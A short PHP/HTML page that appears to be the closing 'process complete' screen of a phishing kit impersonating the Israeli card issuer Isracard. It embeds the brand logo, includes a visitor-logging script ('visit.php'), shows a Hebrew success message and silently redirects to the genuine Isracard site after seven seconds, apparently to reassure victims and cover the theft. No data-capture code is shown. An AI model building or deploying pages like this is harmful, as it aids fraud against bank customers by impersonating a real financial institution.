<?php include("visit.php"); ?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta http-equiv='refresh' content='7; url=https://digital.isracard.co.il/'/>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ISRA</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <link rel="stylesheet" href="res/css/style.css">
        <link rel="stylesheet" href="res/css/media.css">
    </head>
    <body>
        <header>
            <img src="data:image/png;base64,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" style="height:50px" class="lg-mobile">
        </header>
        <main>
            <div class="form" style="text-align:center;">
                <h1 style="font-size:4em; color:green;">
                    <i class="fa-solid fa-circle-check"></i>
                </h1>
                <h2>התהליך הושלם</h2>
            </div>
        </main>
    </body>
</html>
